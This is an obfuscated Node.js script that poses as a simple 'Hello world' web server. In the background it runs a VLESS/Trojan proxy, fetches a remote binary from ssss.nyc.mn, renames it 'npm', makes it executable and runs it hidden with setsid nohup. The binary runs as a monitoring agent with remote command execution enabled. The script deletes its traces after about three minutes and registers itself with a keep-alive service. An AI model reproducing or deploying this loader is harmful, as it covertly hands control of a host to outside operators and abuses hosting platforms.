const _0x2a1e6d=_0x5203;(function(_0xb32c93,_0x58ef0c){const _0x2aa04e=_0x5203,_0x3ec07a=_0xb32c93();while(!![]){try{const _0x48d530=-parseInt(_0x2aa04e(0x199))/0x1*(parseInt(_0x2aa04e(0x158))/0x2)+-parseInt(_0x2aa04e(0x19e))/0x3*(-parseInt(_0x2aa04e(0x19c))/0x4)+parseInt(_0x2aa04e(0x1b1))/0x5+-parseInt(_0x2aa04e(0x1a8))/0x6*(parseInt(_0x2aa04e(0x148))/0x7)+-parseInt(_0x2aa04e(0x13e))/0x8+-parseInt(_0x2aa04e(0x1a3))/0x9+-parseInt(_0x2aa04e(0x19d))/0xa*(-parseInt(_0x2aa04e(0x153))/0xb);if(_0x48d530===_0x58ef0c)break;else _0x3ec07a['push'](_0x3ec07a['shift']());}catch(_0x2269ee){_0x3ec07a['push'](_0x3ec07a['shift']());}}}(_0x3652,0xeb4e7));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x2a1e6d(0x198)),net=require(_0x2a1e6d(0x184)),path=require(_0x2a1e6d(0x179)),crypto=require(_0x2a1e6d(0x19b)),{Buffer}=require(_0x2a1e6d(0x15a)),{exec,execSync}=require(_0x2a1e6d(0x151)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2a1e6d(0x152)][_0x2a1e6d(0x171)]||_0x2a1e6d(0x149),NEZHA_SERVER=process['env'][_0x2a1e6d(0x14e)]||'',NEZHA_PORT=process['env'][_0x2a1e6d(0x17b)]||'',NEZHA_KEY=process[_0x2a1e6d(0x152)][_0x2a1e6d(0x143)]||'',DOMAIN=process[_0x2a1e6d(0x152)][_0x2a1e6d(0x1b6)]||_0x2a1e6d(0x16e),AUTO_ACCESS=process[_0x2a1e6d(0x152)]['AUTO_ACCESS']||!![],WSPATH=process[_0x2a1e6d(0x152)][_0x2a1e6d(0x147)]||UUID[_0x2a1e6d(0x183)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x2a1e6d(0x13a),NAME=process[_0x2a1e6d(0x152)][_0x2a1e6d(0x1af)]||_0x2a1e6d(0x1b5),PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2c01ad=_0x2a1e6d;try{const _0x4178a9=await axios[_0x2c01ad(0x142)](_0x2c01ad(0x192)),_0x45cc94=_0x4178a9['data'];ISP=(_0x45cc94[_0x2c01ad(0x190)]+'-'+_0x45cc94[_0x2c01ad(0x18a)])['replace'](/ /g,'_');}catch(_0x34ada8){ISP=_0x2c01ad(0x175);}};GetISP();function _0x3652(){const _0xc848ae=['7702092Mgdcli','data','error','write','concat','6AGbmVD','error:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','url','text/html','readFile','length','NAME','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','7954100XYkuZe',':443?security=tls&sni=','1.1.1.1','map','Hug','DOMAIN','https://amd64.ssss.nyc.mn/agent','&path=%2F','true','sub','stream','readUInt8','application/json','9115880kmyYDI','then','substr','hex','get','NEZHA_KEY','pipe','/bin/bash','application/dns-json','WSPATH','5537658grkIqr','6a307db8-a211-483a-9014-38f3c348bfd1','includes','writeFileSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://arm64.ssss.nyc.mn/v1','NEZHA_SERVER','443','connection','child_process','env','31155883vRvvIM','--tls','&fp=chrome&type=ws&host=','toString','setsid\x20nohup\x20./npm\x20-s\x20','22xHUsBx','type','buffer','npm\x20is\x20running','base64','end','&type=A','Server\x20is\x20running\x20on\x20port\x20','createWriteStream','index.html','digest','post','createServer','once','arm64','message','trim','log','2083','config.yaml','unlink','send','1234.abc.com','https://oooo.serv00.net/add-url','npm\x20download\x20successfully','UUID','Server',':443?encryption=none&security=tls&sni=','client_secret:\x20','Unknown','join','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Hello\x20world!','path','npm','NEZHA_PORT','decode','Failed\x20to\x20resolve\x20','from','readUInt16BE','reduce','createHash','catch','slice','net','Answer','chmod\x20+x\x20npm','8.8.4.4','close','npm\x20running\x20error:','asOrganization','Status','utf8','sha224','update','\x20-p\x20','country','https://amd64.ssss.nyc.mn/v1','https://speed.cloudflare.com/meta','2087','every','https://arm64.ssss.nyc.mn/agent','2096','writeHead','axios','130652XQLlcB','npm\x20is\x20already\x20running,\x20skip\x20running...','crypto','4RGQFeY','10FwlNop','2292543Sonnvs','connect','replace','text/plain','\x20with\x20all\x20DNS\x20servers'];_0x3652=function(){return _0xc848ae;};return _0x3652();}const httpServer=http[_0x2a1e6d(0x164)]((_0x2590a9,_0x5db98c)=>{const _0x53c628=_0x2a1e6d;if(_0x2590a9['url']==='/'){const _0x2e5ddd=path[_0x53c628(0x176)](__dirname,_0x53c628(0x161));fs[_0x53c628(0x1ad)](_0x2e5ddd,_0x53c628(0x18c),(_0x4af9b1,_0x447136)=>{const _0x26b0dc=_0x53c628;if(_0x4af9b1){_0x5db98c[_0x26b0dc(0x197)](0xc8,{'Content-Type':_0x26b0dc(0x1ac)}),_0x5db98c[_0x26b0dc(0x15d)](_0x26b0dc(0x178));return;}_0x5db98c[_0x26b0dc(0x197)](0xc8,{'Content-Type':'text/html'}),_0x5db98c[_0x26b0dc(0x15d)](_0x447136);});return;}else{if(_0x2590a9[_0x53c628(0x1ab)]==='/'+SUB_PATH){const _0x42668a='vless://'+UUID+'@'+DOMAIN+_0x53c628(0x173)+DOMAIN+_0x53c628(0x155)+DOMAIN+_0x53c628(0x138)+WSPATH+'#'+NAME+'-'+ISP,_0x53fce7='trojan://'+UUID+'@'+DOMAIN+_0x53c628(0x1b2)+DOMAIN+_0x53c628(0x155)+DOMAIN+_0x53c628(0x138)+WSPATH+'#'+NAME+'-'+ISP,_0x1ff3e5=_0x42668a+'\x0a'+_0x53fce7,_0x581542=Buffer[_0x53c628(0x17e)](_0x1ff3e5)[_0x53c628(0x156)](_0x53c628(0x15c));_0x5db98c[_0x53c628(0x197)](0xc8,{'Content-Type':_0x53c628(0x1a1)}),_0x5db98c['end'](_0x581542+'\x0a');}else _0x5db98c[_0x53c628(0x197)](0x194,{'Content-Type':_0x53c628(0x1a1)}),_0x5db98c[_0x53c628(0x15d)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x2a1e6d(0x172))]({'server':httpServer}),uuid=UUID[_0x2a1e6d(0x1a0)](/-/g,''),DNS_SERVERS=[_0x2a1e6d(0x187),_0x2a1e6d(0x1b3)];function resolveHost(_0x9e3307){return new Promise((_0x44de94,_0x20cb01)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x9e3307)){_0x44de94(_0x9e3307);return;}let _0x597d2e=0x0;function _0x451b21(){const _0x4c50c0=_0x5203;if(_0x597d2e>=DNS_SERVERS[_0x4c50c0(0x1ae)]){_0x20cb01(new Error(_0x4c50c0(0x17d)+_0x9e3307+_0x4c50c0(0x1a2)));return;}const _0x2e9724=DNS_SERVERS[_0x597d2e];_0x597d2e++;const _0xaf2248='https://dns.google/resolve?name='+encodeURIComponent(_0x9e3307)+_0x4c50c0(0x15e);axios[_0x4c50c0(0x142)](_0xaf2248,{'timeout':0x1388,'headers':{'Accept':_0x4c50c0(0x146)}})[_0x4c50c0(0x13f)](_0x4c8ff7=>{const _0xc8d134=_0x4c50c0,_0x3db0ce=_0x4c8ff7[_0xc8d134(0x1a4)];if(_0x3db0ce[_0xc8d134(0x18b)]===0x0&&_0x3db0ce[_0xc8d134(0x185)]&&_0x3db0ce[_0xc8d134(0x185)][_0xc8d134(0x1ae)]>0x0){const _0x5ea7c4=_0x3db0ce[_0xc8d134(0x185)]['find'](_0x514ce0=>_0x514ce0[_0xc8d134(0x159)]===0x1);if(_0x5ea7c4){_0x44de94(_0x5ea7c4[_0xc8d134(0x1a4)]);return;}}_0x451b21();})[_0x4c50c0(0x182)](_0x593826=>{_0x451b21();});}_0x451b21();});}function _0x5203(_0x525a1c,_0x53ebbf){const _0x365289=_0x3652();return _0x5203=function(_0x5203d8,_0x5230cd){_0x5203d8=_0x5203d8-0x138;let _0xac3b30=_0x365289[_0x5203d8];return _0xac3b30;},_0x5203(_0x525a1c,_0x53ebbf);}function handleVlessConnection(_0x1d77db,_0x461ddb){const _0x400261=_0x2a1e6d,[_0x5b02e8]=_0x461ddb,_0x434df1=_0x461ddb['slice'](0x1,0x11);if(!_0x434df1[_0x400261(0x194)]((_0x3d02a4,_0x7424b6)=>_0x3d02a4==parseInt(uuid[_0x400261(0x140)](_0x7424b6*0x2,0x2),0x10)))return![];let _0x59c690=_0x461ddb[_0x400261(0x183)](0x11,0x12)[_0x400261(0x13c)]()+0x13;const _0x333b73=_0x461ddb['slice'](_0x59c690,_0x59c690+=0x2)['readUInt16BE'](0x0),_0x42b58f=_0x461ddb['slice'](_0x59c690,_0x59c690+=0x1)[_0x400261(0x13c)](),_0x13c45a=_0x42b58f==0x1?_0x461ddb[_0x400261(0x183)](_0x59c690,_0x59c690+=0x4)['join']('.'):_0x42b58f==0x2?new TextDecoder()[_0x400261(0x17c)](_0x461ddb[_0x400261(0x183)](_0x59c690+0x1,_0x59c690+=0x1+_0x461ddb[_0x400261(0x183)](_0x59c690,_0x59c690+0x1)[_0x400261(0x13c)]())):_0x42b58f==0x3?_0x461ddb[_0x400261(0x183)](_0x59c690,_0x59c690+=0x10)[_0x400261(0x180)]((_0x5c937d,_0x3cbc39,_0x32bdaa,_0x105f2e)=>_0x32bdaa%0x2?_0x5c937d[_0x400261(0x1a7)](_0x105f2e['slice'](_0x32bdaa-0x1,_0x32bdaa+0x1)):_0x5c937d,[])[_0x400261(0x1b4)](_0x48b56d=>_0x48b56d['readUInt16BE'](0x0)[_0x400261(0x156)](0x10))[_0x400261(0x176)](':'):'';_0x1d77db[_0x400261(0x16d)](new Uint8Array([_0x5b02e8,0x0]));const _0x173e5d=createWebSocketStream(_0x1d77db);return resolveHost(_0x13c45a)[_0x400261(0x13f)](_0x20836c=>{const _0x49679d=_0x400261;net['connect']({'host':_0x20836c,'port':_0x333b73},function(){const _0x52eef2=_0x5203;this[_0x52eef2(0x1a6)](_0x461ddb[_0x52eef2(0x183)](_0x59c690)),_0x173e5d['on'](_0x52eef2(0x1a5),()=>{})[_0x52eef2(0x144)](this)['on'](_0x52eef2(0x1a5),()=>{})['pipe'](_0x173e5d);})['on'](_0x49679d(0x1a5),()=>{});})['catch'](_0x497066=>{net['connect']({'host':_0x13c45a,'port':_0x333b73},function(){const _0x121d96=_0x5203;this[_0x121d96(0x1a6)](_0x461ddb[_0x121d96(0x183)](_0x59c690)),_0x173e5d['on']('error',()=>{})['pipe'](this)['on'](_0x121d96(0x1a5),()=>{})[_0x121d96(0x144)](_0x173e5d);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2a53cf,_0x2ead7f){const _0x54f1a2=_0x2a1e6d;try{if(_0x2ead7f[_0x54f1a2(0x1ae)]<0x3a)return![];const _0x119f4b=_0x2ead7f[_0x54f1a2(0x183)](0x0,0x38)[_0x54f1a2(0x156)](),_0x236019=[UUID];let _0x595368=null;for(const _0x2b5630 of _0x236019){const _0x18650d=crypto[_0x54f1a2(0x181)](_0x54f1a2(0x18d))[_0x54f1a2(0x18e)](_0x2b5630)[_0x54f1a2(0x162)](_0x54f1a2(0x141));if(_0x18650d===_0x119f4b){_0x595368=_0x2b5630;break;}}if(!_0x595368)return![];let _0x2403ca=0x38;_0x2ead7f[_0x2403ca]===0xd&&_0x2ead7f[_0x2403ca+0x1]===0xa&&(_0x2403ca+=0x2);const _0x119114=_0x2ead7f[_0x2403ca];if(_0x119114!==0x1)return![];_0x2403ca+=0x1;const _0x4478f6=_0x2ead7f[_0x2403ca];_0x2403ca+=0x1;let _0x206387,_0x196ab5;if(_0x4478f6===0x1)_0x206387=_0x2ead7f[_0x54f1a2(0x183)](_0x2403ca,_0x2403ca+0x4)[_0x54f1a2(0x176)]('.'),_0x2403ca+=0x4;else{if(_0x4478f6===0x3){const _0x4fc3f0=_0x2ead7f[_0x2403ca];_0x2403ca+=0x1,_0x206387=_0x2ead7f[_0x54f1a2(0x183)](_0x2403ca,_0x2403ca+_0x4fc3f0)[_0x54f1a2(0x156)](),_0x2403ca+=_0x4fc3f0;}else{if(_0x4478f6===0x4)_0x206387=_0x2ead7f[_0x54f1a2(0x183)](_0x2403ca,_0x2403ca+0x10)[_0x54f1a2(0x180)]((_0x3c09e1,_0x2af4b8,_0x2501ad,_0x6a248f)=>_0x2501ad%0x2?_0x3c09e1[_0x54f1a2(0x1a7)](_0x6a248f[_0x54f1a2(0x183)](_0x2501ad-0x1,_0x2501ad+0x1)):_0x3c09e1,[])[_0x54f1a2(0x1b4)](_0x2c37e1=>_0x2c37e1[_0x54f1a2(0x17f)](0x0)[_0x54f1a2(0x156)](0x10))['join'](':'),_0x2403ca+=0x10;else return![];}}_0x196ab5=_0x2ead7f[_0x54f1a2(0x17f)](_0x2403ca),_0x2403ca+=0x2;_0x2403ca<_0x2ead7f['length']&&_0x2ead7f[_0x2403ca]===0xd&&_0x2ead7f[_0x2403ca+0x1]===0xa&&(_0x2403ca+=0x2);const _0xbefd52=createWebSocketStream(_0x2a53cf);return resolveHost(_0x206387)['then'](_0x568350=>{const _0xbb04c7=_0x54f1a2;net[_0xbb04c7(0x19f)]({'host':_0x568350,'port':_0x196ab5},function(){const _0x141d4a=_0xbb04c7;_0x2403ca<_0x2ead7f['length']&&this[_0x141d4a(0x1a6)](_0x2ead7f[_0x141d4a(0x183)](_0x2403ca)),_0xbefd52['on'](_0x141d4a(0x1a5),()=>{})[_0x141d4a(0x144)](this)['on'](_0x141d4a(0x1a5),()=>{})[_0x141d4a(0x144)](_0xbefd52);})['on'](_0xbb04c7(0x1a5),()=>{});})[_0x54f1a2(0x182)](_0x23e30b=>{const _0x1c75ef=_0x54f1a2;net[_0x1c75ef(0x19f)]({'host':_0x206387,'port':_0x196ab5},function(){const _0x55f347=_0x1c75ef;_0x2403ca<_0x2ead7f[_0x55f347(0x1ae)]&&this[_0x55f347(0x1a6)](_0x2ead7f['slice'](_0x2403ca)),_0xbefd52['on']('error',()=>{})[_0x55f347(0x144)](this)['on'](_0x55f347(0x1a5),()=>{})[_0x55f347(0x144)](_0xbefd52);})['on']('error',()=>{});}),!![];}catch(_0x319b8a){return![];}}wss['on'](_0x2a1e6d(0x150),(_0x15fac9,_0x2c0a92)=>{const _0x48d4b8=_0x2a1e6d,_0x49cea1=_0x2c0a92[_0x48d4b8(0x1ab)]||'';_0x15fac9[_0x48d4b8(0x165)](_0x48d4b8(0x167),_0x4fdb42=>{const _0x9e03=_0x48d4b8;if(_0x4fdb42[_0x9e03(0x1ae)]>0x11&&_0x4fdb42[0x0]===0x0){const _0x55321e=_0x4fdb42[_0x9e03(0x183)](0x1,0x11),_0x238041=_0x55321e[_0x9e03(0x194)]((_0x542af6,_0x959cec)=>_0x542af6==parseInt(uuid['substr'](_0x959cec*0x2,0x2),0x10));if(_0x238041){!handleVlessConnection(_0x15fac9,_0x4fdb42)&&_0x15fac9[_0x9e03(0x188)]();return;}}!handleTrojanConnection(_0x15fac9,_0x4fdb42)&&_0x15fac9[_0x9e03(0x188)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x22a931=_0x2a1e6d,_0x352afd=os['arch']();return _0x352afd==='arm'||_0x352afd===_0x22a931(0x166)||_0x352afd==='aarch64'?!NEZHA_PORT?_0x22a931(0x14d):_0x22a931(0x195):!NEZHA_PORT?_0x22a931(0x191):_0x22a931(0x1b7);},downloadFile=async()=>{const _0x2f54b4=_0x2a1e6d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1f9aef=getDownloadUrl(),_0x2b814a=await axios({'method':_0x2f54b4(0x142),'url':_0x1f9aef,'responseType':_0x2f54b4(0x13b)}),_0x310293=fs[_0x2f54b4(0x160)](_0x2f54b4(0x17a));return _0x2b814a[_0x2f54b4(0x1a4)][_0x2f54b4(0x144)](_0x310293),new Promise((_0x2ef9f4,_0x5bfc5b)=>{const _0x4acc56=_0x2f54b4;_0x310293['on']('finish',()=>{const _0x52d70d=_0x5203;console[_0x52d70d(0x169)](_0x52d70d(0x170)),exec(_0x52d70d(0x186),_0x51e627=>{if(_0x51e627)_0x5bfc5b(_0x51e627);_0x2ef9f4();});}),_0x310293['on'](_0x4acc56(0x1a5),_0x5bfc5b);});}catch(_0x48b320){throw _0x48b320;}},runnz=async()=>{const _0x50947c=_0x2a1e6d;try{const _0x19f050=execSync(_0x50947c(0x1aa),{'encoding':'utf-8'});if(_0x19f050[_0x50947c(0x168)]()!==''){console[_0x50947c(0x169)](_0x50947c(0x19a));return;}}catch(_0x1939c0){}await downloadFile();let _0x1f0cd4='',_0x5da9f8=[_0x50947c(0x14f),'8443',_0x50947c(0x196),_0x50947c(0x193),_0x50947c(0x16a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x24de3c=_0x5da9f8['includes'](NEZHA_PORT)?_0x50947c(0x154):'';_0x1f0cd4=_0x50947c(0x157)+NEZHA_SERVER+':'+NEZHA_PORT+_0x50947c(0x18f)+NEZHA_KEY+'\x20'+_0x24de3c+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x538a58=NEZHA_SERVER[_0x50947c(0x14a)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x509302=_0x5da9f8[_0x50947c(0x14a)](_0x538a58)?_0x50947c(0x139):'false',_0x2c79a0=_0x50947c(0x174)+NEZHA_KEY+_0x50947c(0x14c)+NEZHA_SERVER+_0x50947c(0x1b0)+_0x509302+_0x50947c(0x177)+UUID;fs[_0x50947c(0x14b)](_0x50947c(0x16b),_0x2c79a0);}_0x1f0cd4='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x50947c(0x169)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1f0cd4,{'shell':_0x50947c(0x145)},_0x297509=>{const _0x15cdef=_0x50947c;if(_0x297509)console[_0x15cdef(0x1a5)](_0x15cdef(0x189),_0x297509);else console[_0x15cdef(0x169)](_0x15cdef(0x15b));});}catch(_0x5d4434){console[_0x50947c(0x1a5)](_0x50947c(0x1a9)+_0x5d4434);}};async function addAccessTask(){const _0x2e3b23=_0x2a1e6d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4ad558='https://'+DOMAIN;try{const _0xd6668c=await axios[_0x2e3b23(0x163)](_0x2e3b23(0x16f),{'url':_0x4ad558},{'headers':{'Content-Type':_0x2e3b23(0x13d)}});console[_0x2e3b23(0x169)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x19e1ae){}}const delFiles=()=>{const _0x193357=_0x2a1e6d;fs['unlink'](_0x193357(0x17a),()=>{}),fs[_0x193357(0x16c)](_0x193357(0x16b),()=>{});};httpServer['listen'](PORT,()=>{const _0x18e436=_0x2a1e6d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x18e436(0x169)](_0x18e436(0x15f)+PORT);});
